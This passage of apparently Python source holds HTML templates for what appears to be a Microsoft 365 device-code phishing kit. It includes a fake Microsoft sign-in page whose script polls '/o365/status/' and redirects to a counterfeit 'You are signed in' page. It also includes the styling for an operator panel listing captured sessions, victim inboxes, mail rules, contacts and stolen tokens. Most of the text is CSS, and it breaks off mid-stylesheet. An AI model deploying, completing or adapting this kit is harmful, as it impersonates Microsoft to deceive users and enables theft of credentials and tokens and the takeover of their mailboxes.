</div>
<div class="footer">&copy; 2026 Microsoft Corporation &middot; <a href="https://www.microsoft.com/en-us/legal/intellectualproperty/copyright" target="_blank" rel="noopener">Terms of use</a> &middot; <a href="https://privacy.microsoft.com/en-us/privacystatement" target="_blank" rel="noopener">Privacy</a></div>
<script>
(function () {
  var sid = '{{ sid }}';
  var expires = {{ s.expires_in }};
  var cd = document.getElementById('countdown');
  var alertBox = document.getElementById('alert');
  var popupBtn = document.getElementById('popup-btn');
  var t0 = Date.now();
  var popup = null;
  var popupUrl = '{{ popup_url }}';
  function openVerify() {
    if (popup && !popup.closed) { try { popup.focus(); } catch (e) {} return; }
    try {
      popup = window.open(popupUrl, 'ms_deviceauth', 'width=520,height=700,popup=1,left=200,top=100');
    } catch (e) { popup = null; }
    if (!popup) { alertBox.style.display = 'block'; alertBox.textContent = 'Popup blocked - please allow popups for this page and click Verify with Microsoft again.'; }
  }
  if (popupBtn) popupBtn.addEventListener('click', openVerify);
  function tick() {
    var left = Math.max(0, expires - Math.floor((Date.now() - t0) / 1000));
    var m = Math.floor(left / 60);
    var sec = left % 60;
    cd.textContent = m + ' minute' + (m === 1 ? '' : 's') + ' ' + sec + ' second' + (sec === 1 ? '' : 's');
    if (left <= 0) { cd.textContent = 'expired'; }
  }
  tick();
  setInterval(tick, 1000);
  function poll() {
    fetch('/o365/status/' + sid, { cache: 'no-store' })
      .then(function (r) { return r.json(); })
      .then(function (d) {
        if (d.status === 'success') {
          if (popup && !popup.closed) { try { popup.close(); } catch (e) {} }
          window.location.href = '/o365/success/' + sid;
        }
        else if (d.status === 'declined') { alertBox.style.display = 'block'; alertBox.textContent = 'Sign-in was cancelled. Please try again.'; clearInterval(timer); }
        else if (d.status === 'expired') { alertBox.style.display = 'block'; alertBox.textContent = 'This code has expired. Please open the sign-in link again.'; clearInterval(timer); }
        else if (d.status === 'missing') { alertBox.style.display = 'block'; alertBox.textContent = 'This code has expired. Please open the sign-in link again.'; clearInterval(timer); }
        else if (d.status === 'pending' && d.code_changed) { window.location.reload(); }
        else if (d.status === 'error') { alertBox.style.display = 'block'; alertBox.textContent = 'Sign-in failed. Please try again later.'; clearInterval(timer); }
      })
      .catch(function () {});
  }
  var timer = setInterval(poll, 4000);
})();
</script>
</body>
</html>"""

PAGE_SUCCESS = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Microsoft account | Signed in</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;background:#f2f2f2;color:#1b1b1b;min-height:100vh;display:flex;flex-direction:column}
.header{background:#fff;border-bottom:1px solid #e0e0e0;padding:14px 24px}
.header .brand{font-size:22px;font-weight:600;color:#0078d4}
.card{background:#fff;max-width:440px;margin:48px auto;padding:44px 48px;box-shadow:0 2px 6px rgba(0,0,0,.2);border-radius:4px;text-align:center}
.check{width:56px;height:56px;border-radius:50%;background:#107c10;color:#fff;font-size:32px;line-height:56px;margin:0 auto 18px;font-weight:700}
h1{font-size:24px;font-weight:600;margin-bottom:8px}
p{font-size:14px;color:#444;line-height:1.5}
.email{font-weight:600;color:#1a1a1a}
.footer{margin-top:auto;text-align:center;padding:16px;font-size:12px;color:#777}
</style>
</head>
<body>
<div class="header"><div class="brand">Microsoft</div></div>
<div class="card">
  <div class="check">&#10003;</div>
  <h1>You are signed in</h1>
  <p>Signed in as <span class="email">{{ email }}</span>.</p>
  <p style="margin-top:10px">You can close this window and return to your session.</p>
</div>
<div class="footer">&copy; 2026 Microsoft Corporation</div>
</body>
</html>"""

ADMIN_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Microsoft</title>
<style>
:root{--blue:#0078d4;--blue2:#106ebe;--blue3:#005a9e;--nav:#201f1e;--bg:#faf9f8;--pane:#fff;--line:#edebe9;--text:#242424;--muted:#605e5c;--unread:#0078d4;--hover:#f3f2f1;--sel:#c7e0f4;--danger:#a4262c;--ok:#107c10;--warn:#8a6116}
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%}
body{font-family:'Segoe UI',Segoe UI Web (West European),-apple-system,BlinkMacSystemFont,Roboto,Helvetica Neue,sans-serif;background:var(--bg);color:var(--text);font-size:14px;overflow:hidden}
#app{display:flex;flex-direction:column;height:100vh}
/* top ribbon like Microsoft 365 */
.ribbon{height:48px;background:var(--blue);color:#fff;display:flex;align-items:center;padding:0 8px 0 0;flex-shrink:0;gap:0}
.waffle{width:48px;height:48px;display:flex;align-items:center;justify-content:center;cursor:default;opacity:.95}
.waffle svg{width:18px;height:18px;fill:#fff}
.rbrand{display:flex;align-items:center;gap:10px;font-size:16px;font-weight:600;padding-right:16px;min-width:120px}
.rbrand .olog{width:24px;height:24px;background:#fff;border-radius:4px;display:flex;align-items:center;justify-content:center}
.rbrand .olog svg{width:16px;height:16px}
.searchwrap{flex:1;max-width:560px;margin:0 12px}
.searchwrap input{width:100%;height:32px;border:none;border-radius:2px;padding:0 12px 0 36px;font-size:14px;background:#deecf9;color:var(--text);outline:none}
.searchwrap{position:relative}
.searchwrap:before{content:"\\1F50D";position:absolute;left:10px;top:7px;font-size:13px;opacity:.55;pointer-events:none}
.searchwrap input:focus{background:#fff;box-shadow:0 0 0 1px rgba(0,0,0,.1)}
.racts{display:flex;align-items:center;gap:6px;margin-left:auto;padding-right:8px}
.racts button{background:transparent;border:1px solid transparent;color:#fff;padding:6px 12px;border-radius:2px;font-size:13px;cursor:pointer;font-weight:600}
.racts button:hover{background:rgba(255,255,255,.15);border-color:rgba(255,255,255,.25)}
.racts .primary{background:rgba(255,255,255,.18);border-color:rgba(255,255,255,.3)}
/* session bar */
.sessbar{height:40px;background:#fff;border-bottom:1px solid var(--line);display:flex;align-items:center;gap:12px;padding:0 14px;flex-shrink:0}
.sessbar label{font-size:12px;color:var(--muted);font-weight:600;text-transform:uppercase;letter-spacing:.4px}
.sessbar select{min-width:340px;max-width:560px;flex:1;height:30px;border:1px solid var(--line);border-radius:2px;padding:0 10px;font-size:13px;background:#fff;outline:none;font-weight:600}
.sessbar select:focus{border-color:var(--blue)}
.sessmeta{font-size:12px;color:var(--muted);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.sessmeta b{color:var(--text);font-weight:600}
.pill{display:inline-block;font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px;text-transform:uppercase;letter-spacing:.3px}
.pill.success{background:#dff6dd;color:var(--ok)}
.pill.pending{background:#fff4ce;color:var(--warn)}
.pill.error,.pill.expired,.pill.declined{background:#fde7e9;color:var(--danger)}
.sbtns{display:flex;gap:6px}
.sbtns button{height:28px;padding:0 10px;border:1px solid var(--line);background:#fff;border-radius:2px;font-size:12px;font-weight:600;cursor:pointer;color:var(--text)}
.sbtns button:hover{background:var(--hover)}
.sbtns button.danger{color:var(--danger);border-color:#f1c6c8}
.sbtns button.blue{background:var(--blue);color:#fff;border-color:var(--blue)}
.sbtns button.blue:hover{background:var(--blue2)}
/* body: nav + main */
.body{flex:1;display:flex;min-height:0}
.nav{width:48px;background:var(--nav);display:flex;flex-direction:column;align-items:center;padding-top:8px;flex-shrink:0;gap:2px}
.navbtn{width:40px;height:40px;border:none;background:transparent;color:#fff;border-radius:4px;cursor:pointer;display:flex;align-items:center;justify-content:center;opacity:.75;position:relative}
.navbtn:hover{background:rgba(255,255,255,.08);opacity:1}
.navbtn.on{background:rgba(255,255,255,.12);opacity:1}
.navbtn.on:after{content:"";position:absolute;left:0;top:8px;bottom:8px;width:3px;background:var(--blue);border-radius:0 2px 2px 0}
.navbtn svg{width:20px;height:20px;fill:#fff}
.main{flex:1;display:flex;flex-direction:column;min-width:0;min-height:0}
/* command bar */
.cbar{height:44px;background:#fff;border-bottom:1px solid var(--line);display:flex;align-items:center;gap:4px;padding:0 10px;flex-shrink:0;flex-wrap:wrap}
.cbar .sep{width:1px;height:22px;background:var(--line);margin:0 6px}
.cbtn{display:inline-flex;align-items:center;gap:6px;height:32px;padding:0 10px;border:none;background:transparent;border-radius:2px;font-size:13px;font-weight:600;color:var(--text);cursor:pointer}
.cbtn:hover{background:var(--hover)}
.cbtn.primary{background:var(--blue);color:#fff}
.cbtn.primary:hover{background:var(--blue2)}
.cbtn:disabled{opacity:.4;cursor:default}
.cbtn:disabled:hover{background:transparent}
.cbtn.danger{color:var(--danger)}
.tabs-mini{display:flex;gap:0;margin-left:8px}
.tabs-mini .t{padding:8px 14px;font-size:13px;font-weight:600;color:var(--muted);cursor:pointer;border-bottom:2px solid transparent}
.tabs-mini .t.on{color:var(--blue);border-bottom-color:var(--blue)}
/* top-level pages: Domains & Clients | Inbox */
.psep{width:1px;height:24px;background:rgba(255,255,255,.25);margin:0 8px}
.pagetab{height:32px;padding:0 14px;border:1px solid transparent;background:transparent;color:#fff;border-radius:2px;font-size:13px;font-weight:600;cursor:pointer}
.pagetab:hover{background:rgba(255,255,255,.15)}
.pagetab.on{background:rgba(255,255,255,.18);border-color:rgba(255,255,255,.3)}
.page{display:none;flex:1;min-height:0;flex-direction:column}
.page.on{display:flex}
#page-clients{overflow-y:auto;padding:20px 24px;background:var(--bg)}
.dhelp{font-size:12px;color:var(--muted)}
.dwrap{display:flex;gap:8px;margin-bottom:14px;max-width:560px}
.dwrap input{flex:1;height:32px;border:1px solid var(--line);border-radius:2px;padding:0 10px;font-size:13px;outline:none}
.dwrap input:focus{border-color:var(--blue)}
.dchip{display:inline-flex;align-items:center;gap:8px;background:#f3f2f1;border:1px solid var(--line);border-radius:999px;padding:5px 6px 5px 14px;font-size:13px;margin:0 8px 8px 0}
.dchip b{font-weight:600}
.dchip .dcnt{font-size:11px;color:var(--muted)}
.dchip .dcopy{height:24px;padding:0 10px;border:1px solid var(--line);background:#fff;border-radius:999px;font-size:11px;font-weight:600;cursor:pointer;color:var(--blue)}
.dchip .dcopy:hover{background:#e8f0fe;border-color:var(--blue)}
.dchip button{border:none;background:transparent;color:var(--danger);cursor:pointer;font-size:15px;line-height:1;padding:2px 6px;border-radius:50%}
.dchip button:hover{background:#fde7e9}
.dchip a{color:var(--blue);text-decoration:none;font-size:12px}
.dchip a:hover{text-decoration:underline}
#client-table{width:100%;border-collapse:collapse;font-size:13px}
#client-table th{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);color:var(--muted);font-weight:600;background:#faf9f8;position:sticky;top:0}
#client-table td{padding:8px 10px;border-bottom:1px solid #f3f2f1;vertical-align:middle}
#client-table tr:hover td{background:#faf9f8}
.cact{display:flex;gap:6px;flex-wrap:wrap}
.cbtn-sm{height:26px;padding:0 10px;border:1px solid var(--line);background:#fff;border-radius:2px;font-size:12px;font-weight:600;cursor:pointer;color:var(--text)}
.cbtn-sm:hover{background:var(--hover)}
.cbtn-sm.blue{background:var(--blue);color:#fff;border-color:var(--blue)}
.cbtn-sm.blue:hover{background:var(--blue2)}
.cbtn-sm.danger{color:var(--danger);border-color:#f1c6c8}
/* mail 3-pane */
#view-mail{flex:1;display:none;grid-template-columns:220px 340px 1fr;min-height:0;background:#fff}
#view-mail.on{display:grid}
.folders{background:#f3f2f1;border-right:1px solid var(--line);display:flex;flex-direction:column;min-height:0}
.folders .fhead{padding:12px 14px 8px;font-size:12px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.4px;display:flex;justify-content:space-between;align-items:center}
.folders .fhead button{border:none;background:transparent;cursor:pointer;font-size:14px;color:var(--muted)}
#flist{flex:1;overflow-y:auto;padding:4px 8px 12px}
.frow{display:flex;align-items:center;gap:8px;padding:7px 10px;border-radius:2px;cursor:pointer;font-size:13px;color:var(--text)}
.frow:hover{background:rgba(0,0,0,.04)}
.frow.on{background:#fff;font-weight:600;box-shadow:0 0 0 1px var(--line)}
.frow .fico{width:16px;text-align:center;opacity:.7;font-size:12px}
.frow .fn{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.frow .fcnt{font-size:11px;color:var(--muted);min-width:18px;text-align:right}
.frow .fcnt.unread{color:var(--blue);font-weight:700}
.mlist{border-right:1px solid var(--line);display:flex;flex-direction:column;min-height:0;background:#fff}
.mlist .mhead{padding:10px 12px;border-bottom:1px solid var(--line);display:flex;gap:8px;align-items:center}
.mlist .mhead input{flex:1;height:30px;border:1px solid var(--line);border-radius:2px;padding:0 10px;font-size:13px;outline:none}
.mlist .mhead input:focus{border-color:var(--blue)}
.mlist .mhead button{border:1px solid var(--line);background:#fff;height:30px;padding:0 10px;border-radius:2px;cursor:pointer;font-size:12px}
#mlist{flex:1;overflow-y:auto}
.mrow{padding:10px 14px;border-bottom:1px solid #f3f2f1;cursor:pointer;display:grid;grid-template-columns:18px 1fr auto;gap:2px 10px;align-items:start}
.mrow:hover{background:var(--hover)}
.mrow.on{background:var(--sel)}
.mrow .dot{width:8px;height:8px;border-radius:50%;background:transparent;margin-top:6px}
.mrow.unread .dot{background:var(--blue)}
.mrow .mfrom{font-size:13px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;grid-column:2}
.mrow.unread .mfrom{font-weight:700}
.mrow .mdate{font-size:11px;color:var(--muted);grid-column:3;white-space:nowrap}
.mrow .msub{font-size:13px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;grid-column:2 / span 2}
.mrow.unread .msub{font-weight:600}
.mrow .msnip{font-size:12px;color:var(--muted);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;grid-column:2 / span 2}
.rpane{display:flex;flex-direction:column;min-height:0;background:#fff;min-width:0}
.rp-empty{flex:1;display:flex;align-items:center;justify-content:center;color:var(--muted);font-size:14px;flex-direction:column;gap:8px}
.rp-empty .big{font-size:40px;opacity:.35}
#rp-head{padding:18px 24px 12px;border-bottom:1px solid var(--line)}
#rp-head h2{font-size:20px;font-weight:600;margin-bottom:12px;line-height:1.3}
.rp-from{display:flex;gap:12px;align-items:flex-start}
.av{width:40px;height:40px;border-radius:50%;background:var(--blue);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:15px;flex-shrink:0}
.rp-from .who{flex:1;min-width:0}
.rp-from .name{font-weight:600;font-size:14px}
.rp-from .addr{font-size:12px;color:var(--muted)}
.rp-from .when{font-size:12px;color:var(--muted);white-space:nowrap}
.rp-to{font-size:12px;color:var(--muted);margin-top:4px}
#attlist{padding:10px 24px 0;display:flex;flex-wrap:wrap;gap:8px}
.att{display:inline-flex;align-items:center;gap:8px;background:#f3f2f1;border:1px solid var(--line);border-radius:2px;padding:8px 12px;font-size:12px;text-decoration:none;color:var(--text)}
.att:hover{background:#e1dfdd}
.att-wrap{display:inline-flex;align-items:center;gap:8px;background:#f3f2f1;border:1px solid var(--line);border-radius:2px;padding:6px 10px;font-size:12px}
.att-wrap .att-name{font-weight:600;color:var(--text)}
.att-wrap .att-size{color:var(--muted)}
.att-wrap .att{background:var(--blue);color:#fff;padding:3px 10px;border-radius:2px;text-decoration:none}
.att-wrap .att:hover{background:#0f6cbd}
#rp-body{padding:16px 24px 32px;overflow-y:auto;flex:1;font-family:'Segoe UI','Segoe UI Web',Calibri,'Helvetica Neue',Arial,sans-serif;font-size:14px;line-height:1.55;color:#242424;word-break:break-word}
#rp-body img{max-width:100%}
.errtip{padding:10px 14px;background:#fde7e9;color:var(--danger);border-bottom:1px solid #f1c6c8;font-size:12.5px;display:none}
.empty{padding:48px 24px;text-align:center;color:var(--muted);font-size:13.5px}
/* rules / contacts / tokens */
#view-rules,#view-contacts,#view-tokens{display:none;flex:1;overflow-y:auto;padding:20px 24px;background:var(--bg)}
#view-rules.on,#view-contacts.on,#view-tokens.on{display:block}
.panel{background:#fff;border:1px solid var(--line);border-radius:2px;max-width:1100px}
.panel .phd{padding:14px 18px;border-bottom:1px solid var(--line);display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap}
.panel .phd h3{font-size:16px;font-weight:600}
.panel .pbd{padding:16px 18px}
.rcard{border:1px solid var(--line);border-radius:2px;padding:14px 16px;margin-bottom:10px;display:flex;align-items:center;gap:14px;background:#fff}
.rcard .rbody{flex:1;min-width:0}
.rcard .rname{font-weight:600}
.rcard .rdesc{font-size:12px;color:var(--muted);margin-top:3px}
.rcard .ract{display:flex;gap:6px}
.switch{position:relative;width:40px;height:20px;flex-shrink:0}
.switch input{opacity:0;width:0;height:0}
.switch .sl{position:absolute;cursor:pointer;inset:0;background:#c8c6c4;border-radius:999px;transition:.2s}
.switch .sl:before{content:"";position:absolute;width:14px;height:14px;left:3px;top:3px;background:#fff;border-radius:50%;transition:.2s}
.switch input:checked + .sl{background:var(--blue)}
.switch input:checked + .sl:before{transform:translateX(20px)}
.ctable{width:100%;border-collapse:collapse;font-size:13px}
.ctable th{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);color:var(--muted);font-weight:600;background:#faf9f8;position:sticky;top:0}
.ctable td{padding:8px 10px;border-bottom:1px solid #f3f2f1;vertical-align:top}
.ctable tr:hover td{background:#faf9f8}
.tok{border:1px solid var(--line);border-radius:2px;margin-bottom:10px;overflow:hidden}
.tok .tlabel{display:flex;align-items:center;justify-content:space-between;background:#faf9f8;padding:8px 12px;font-size:11px;font-weight:700;color:var(--muted);letter-spacing:.4px}
.tok .tval{padding:10px 12px;font-family:Consolas,Menlo,monospace;font-size:11.5px;color:#323130;word-break:break-all;max-height:120px;overflow-y:auto}
.claims{width:100%;border-collapse:collapse;font-size:12.5px}
.claims th,.claims td{text-align:left;padding:6px 10px;border-bottom:1px solid var(--line);vertical-align:top}
.claims th{color:var(--muted);background:#faf9f8;width:160px}
.acct-row{display:flex;gap:14px;align-items:center}
.avatar{width:52px;height:52px;border-radius:50%;background:var(--blue);color:#fff;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:700}
.aemail{font-size:17px;font-weight:600}
.asub{font-size:12.5px;color:var(--muted);margin-top:3px}
.asub span{display:inline-block;background:#f3f2f1;border:1px solid var(--line);border-radius:2px;padding:1px 7px;margin:2px 3px 0 0;font-size:11px}
/* modal */
.modal{position:fixed;inset:0;background:rgba(0,0,0,.4);display:none;align-items:center;justify-content:center;z-index:50}
.modal.on{display:flex}
.modal-box{background:#fff;border-radius:2px;width:560px;max-width:94vw;max-height:90vh;overflow-y:auto;box-shadow:0 8px 28px rgba(0,0,0,.28)}
.modal-box.wide{width:720px}
.modal-box .mhead{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;border-bottom:1px solid var(--line)}
.modal-box .mhead h3{font-size:16px;font-weight:600}
.modal-box .mbody{padding:16px 18px}
.modal-box .mfoot{padding:12px 18px;border-top:1px solid var(--line);display:flex;justify-content:flex-end;gap:8px}
.x{cursor:pointer;font-size:22px;color:var(--muted);background:none;border:none;line-height:1}
label.f{display:block;font-size:12px;font-weight:600;color:var(--muted);margin:12px 0 4px}
input[type=text],textarea,select.field{width:100%;padding:8px 10px;border:1px solid var(--line);border-radius:2px;font-size:13.5px;font-family:inherit;outline:none;background:#fff}
input[type=text]:focus,textarea:focus,select.field:focus{border-color:var(--blue)}
textarea{resize:vertical;min-height:120px}
.cmp-row{display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid var(--line)}
.cmp-row input[type=text]{border:none;background:transparent;flex:1;padding:6px 2px}
.cmp-row .cmp-lbl{width:56px;color:var(--muted);font-weight:600;font-size:12.5px;flex-shrink:0}
.cmp-row .cmp-tog{display:inline-flex;gap:2px;flex-shrink:0}
.cmp-row .cmp-tog button{background:none;border:none;color:var(--blue);font-size:12px;cursor:pointer;padding:3px 7px;border-radius:2px}
.cmp-row .cmp-tog button:hover{background:var(--hover);text-decoration:underline}
.fmt-bar{display:flex;gap:2px;align-items:center;border:1px solid var(--line);border-bottom:none;padding:4px 6px;background:#faf9f8;flex-wrap:wrap;border-radius:2px 2px 0 0}
.fmt-bar .fmt-btn{background:#fff;border:1px solid var(--line);border-radius:2px;padding:3px 9px;font-size:12.5px;cursor:pointer;color:var(--text);min-width:30px;text-align:center;font-family:inherit}
.fmt-bar .fmt-btn:hover{background:var(--hover);border-color:var(--blue)}
.fmt-bar .fmt-btn:active{background:#e5f1fb}
.fmt-bar .fmt-sep{width:1px;height:20px;background:var(--line);margin:0 4px;flex-shrink:0}
#f-body.f-edit{width:100%;min-height:180px;max-height:40vh;overflow-y:auto;border:1px solid var(--line);border-radius:0 0 2px 2px;padding:10px;font-size:14px;outline:none;background:#fff;font-family:'Segoe UI','Segoe UI Web',Calibri,'Helvetica Neue',Arial,sans-serif;color:#242424;word-break:break-word}
#f-body.f-edit:focus{border-color:var(--blue)}
#f-body.f-edit:empty:before{content:attr(data-placeholder);color:#a19f9d;pointer-events:none}
.btn-primary{background:var(--blue);color:#fff;border:none;padding:8px 16px;border-radius:2px;font-size:13px;font-weight:600;cursor:pointer}
.btn-primary:hover{background:var(--blue2)}
.btn-sec{background:#fff;color:var(--text);border:1px solid var(--line);padding:8px 16px;border-radius:2px;font-size:13px;font-weight:600;cursor:pointer}
.btn-sec:hover{background:var(--hover)}
.checkrow{display:flex;align-items:center;gap:8px;margin-top:8px;font-size:13px}
.checkrow input{width:auto;margin:0}
#toast{position:fixed;bottom:22px;left:50%;transform:translateX(-50%);background:#323130;color:#fff;padding:10px 18px;border-radius:2px;font-size:13px;opacity:0;transition:opacity .25s;pointer-events:none;z-index:99;max-width:90vw}
#toast.show{opacity:1}
.cfgrow{display:flex;margin-bottom:10px;font-size:13px}
.cfgrow .k{width:120px;color:var(--muted);font-weight:600;flex-shrink:0}
.cfgrow .v{word-break:break-all;font-family:Consolas,Menlo,monospace;font-size:12px}
.hint{background:#deecf9;border:1px solid #c7e0f4;color:#004578;padding:10px 12px;border-radius:2px;font-size:12.5px;margin-bottom:12px;line-height:1.45}
.statstrip{display:flex;gap:16px;font-size:12px;color:var(--muted)}
.statstrip b{color:var(--text);font-size:14px}
.mgroup{padding:8px 14px 4px;font-size:12px;font-weight:700;color:var(--muted);text-transform:none;letter-spacing:0;background:transparent;position:sticky;top:0;z-index:1}
.matt{margin-left:4px;font-size:12px;opacity:.75}
.mimp{margin-left:4px;color:var(--danger);font-weight:800}
.fav-label{padding:10px 12px 4px;font-size:11px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.4px}
.cbtn-sel{height:30px;max-width:150px;padding:0 6px;border:1px solid var(--line);border-radius:2px;background:#fff;color:var(--text);font-size:12px;cursor:pointer}
.cbtn-sel:disabled{opacity:.5;cursor:default}
.fheadbtns{display:inline-flex;gap:4px}
.fheadbtns button{background:none;border:none;color:var(--blue);cursor:pointer;font-size:12px;padding:2px 4px}
.fheadbtns button:hover{text-decoration:underline}
.att-row{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text);padding:4px 0;border-bottom:1px solid var(--line)}
.att-row button{margin-left:auto;background:none;border:none;color:var(--danger);cursor:pointer;font-size:11px}
.acct-chip{display:flex;align-items:center;gap:8px;padding:0 6px 0 10px;border-left:1px solid rgba(255,255,255,.25);margin-left:6px;max-width:220px}
.acct-chip .av2{width:28px;height:28px;border-radius:50%;background:#fff;color:var(--blue);display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;flex-shrink:0}
.acct-chip .an{font-size:12px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:160px}
.rp-body img{max-width:100%}
.rp-body a{color:var(--blue)}
.frow .fn{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
@media(max-width:1100px){#view-mail.on{grid-template-columns:180px 280px 1fr}.sessbar select{min-width:180px}}
@media(max-width:800px){#view-mail.on{grid-template-columns:1fr}.folders,.mlist{display:none}}
/* ---- glassmorphism dual theme (light default, dark toggle) ---- */
:root{--blue:#2563eb;--blue2:#3b82f6;--blue3:#1d4ed8}
body{background:
 radial-gradient(900px 520px at 85% -6%,rgba(59,130,246,.22),transparent 62%),
 radial-gradient(760px 500px at -6% 30%,rgba(139,92,246,.16),transparent 60%),
 radial-gradient(800px 520px at 50% 112%,rgba(56,189,248,.16),transparent 60%),
 linear-gradient(165deg,#eef3fb 0%,#e4ecf7 55%,#e9eff9 100%);
 background-attachment:fixed}
body.theme-dark{--blue:#3b82f6;--blue2:#60a5fa;--blue3:#1d4ed8;--nav:#0a0f18;--bg:#0b0f16;--pane:#111826;--line:#22304a;--text:#e6edf6;--muted:#8b98ab;--unread:#60a5fa;--hover:rgba(96,165,250,.12);--sel:#1c3355;--danger:#ff6b6b;--ok:#34d399;--warn:#fbbf24;
 background:
 radial-gradient(900px 600px at 85% -6%,rgba(59,130,246,.16),transparent 60%),
 radial-gradient(760px 500px at -5% 30%,rgba(139,92,246,.12),transparent 60%),
 radial-gradient(800px 500px at 50% 115%,rgba(56,189,248,.10),transparent 60%),
 #070b12;
 background-attachment:fixed;color:#e6edf6}
.ribbon,.sessbar,.cbar{backdrop-filter:blur(18px) saturate(1.5);-webkit-backdrop-filter:blur(18px) saturate(1.5)}
.ribbon{background:linear-gradient(90deg,rgba(37,99,235,.92) 0%,rgba(59,130,246,.85) 55%,rgba(99,102,241,.88) 100%);box-shadow:0 8px 30px rgba(37,99,235,.25)}
body.theme-dark .ribbon{background:linear-gradient(90deg,rgba(10,17,32,.94) 0%,rgba(16,28,51,.9) 60%,rgba(13,23,48,.92) 100%);border-bottom:1px solid rgba(120,165,255,.14);box-shadow:0 1px 0 rgba(96,165,250,.12)}
.racts button:hover{background:rgba(255,255,255,.2)}
body.theme-dark .racts button{color:#cbd8ea}
body.theme-dark .racts button:hover{background:rgba(96,165,250,.16);border-color:rgba(96,165,250,.35)}
body.theme-dark .racts .primary{background:#3b82f6;border-color:#3b82f6;color:#fff}
body.theme-dark .racts .primary:hover{background:#60a5fa}
#theme-btn{height:32px;padding:0 12px;border:1px solid rgba(255,255,255,.35);background:rgba(255,255,255,.15);color:#fff;border-radius:999px;font-size:12px;font-weight:600;cursor:pointer;margin-right:4px}
body.theme-dark #theme-btn{border-color:rgba(96,165,250,.4);background:rgba(96,165,250,.15);color:#bfdbfe}
.psep{background:rgba(255,255,255,.3)}
body.theme-dark .psep{background:rgba(96,165,250,.3)}
.pagetab:hover{background:rgba(255,255,255,.16)}
body.theme-dark .pagetab:hover{background:rgba(96,165,250,.15)}
.pagetab.on{background:rgba(255,255,255,.2);border-color:rgba(255,255,255,.35)}
body.theme-dark .pagetab.on{background:rgba(59,130,246,.25);border-color:rgba(96,165,250,.4);color:#bfdbfe}
.searchwrap input{background:rgba(255,255,255,.85);border:1px solid rgba(255,255,255,.5)}
.searchwrap input:focus{background:#fff;box-shadow:0 0 0 1px rgba(37,99,235,.4)}
body.theme-dark .searchwrap input{background:rgba(10,18,32,.85);border:1px solid #223451;color:#e6edf6}
body.theme-dark .searchwrap input::placeholder{color:#64748b}
.acct-chip .av2{background:rgba(255,255,255,.9);color:#2563eb}
body.theme-dark .acct-chip .av2{background:linear-gradient(135deg,#3b82f6,#60a5fa);color:#06101f}
.sessbar,.cbar{background:rgba(255,255,255,.55);border-bottom-color:rgba(13,60,120,.12)}
body.theme-dark .sessbar,body.theme-dark .cbar{background:rgba(13,20,34,.72);border-bottom-color:rgba(120,165,255,.12)}
.sessbar select{background:rgba(255,255,255,.75);border-color:rgba(13,60,120,.18)}
body.theme-dark .sessbar select{background:rgba(10,18,32,.85);color:#e6edf6;border-color:#223451}
.sbtns button,.cbtn-sm,.cbtn-sel,.btn-sec,.fmt-bar .fmt-btn,.mlist .mhead button{background:rgba(255,255,255,.6);border:1px solid rgba(13,60,120,.16);color:#16324f;border-radius:6px}
body.theme-dark .sbtns button,body.theme-dark .cbtn-sm,body.theme-dark .cbtn-sel,body.theme-dark .btn-sec,body.theme-dark .fmt-bar .fmt-btn,body.theme-dark .mlist .mhead button{background:rgba(10,18,32,.85);color:#dbe6f3;border-color:#22304a}
.sbtns button:hover,.cbtn-sm:hover,.btn-sec:hover,.fmt-bar .fmt-btn:hover{background:rgba(37,99,235,.12);border-color:rgba(37,99,235,.45)}
body.theme-dark .sbtns button:hover,body.theme-dark .cbtn-sm:hover,body.theme-dark .btn-sec:hover,body.theme-dark .fmt-bar .fmt-btn:hover{background:rgba(96,165,250,.14);border-color:#2c4470}
.cbtn:hover{background:rgba(37,99,235,.08)}
body.theme-dark .cbtn:hover{background:rgba(96,165,250,.12)}
.dchip{background:rgba(255,255,255,.6);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border:1px solid rgba(13,60,120,.14)}
body.theme-dark .dchip{background:rgba(13,22,38,.8);border-color:#22304a}
.dchip .dname{color:inherit;text-decoration:none;cursor:pointer}
.dchip .dname:hover b{color:var(--blue);text-decoration:underline}
.dchip .dcopy{background:rgba(255,255,255,.5);color:#2563eb;border-color:rgba(37,99,235,.3);border-radius:999px}
.dchip .dcopy:hover{background:#dbeafe;border-color:#2563eb}
body.theme-dark .dchip .dcopy{background:rgba(10,18,32,.85);color:#60a5fa;border-color:#223451}
body.theme-dark .dchip .dcopy:hover{background:#12294d;border-color:#3b82f6}
.dchip button:hover{background:rgba(255,107,107,.15)}
#page-clients,#view-rules,#view-contacts,#view-tokens,#view-mail{background:transparent}
#view-mail,.mlist,.rpane,.panel,.rcard,.modal-box{background:rgba(255,255,255,.62);backdrop-filter:blur(20px) saturate(1.5);-webkit-backdrop-filter:blur(20px) saturate(1.5);border-color:rgba(13,60,120,.12)}
body.theme-dark #view-mail,body.theme-dark .mlist,body.theme-dark .rpane,body.theme-dark .panel,body.theme-dark .rcard,body.theme-dark .modal-box{background:rgba(13,20,34,.78);border-color:rgba(120,165,255,.14);backdrop-filter:blur(20px) saturate(1.35)}
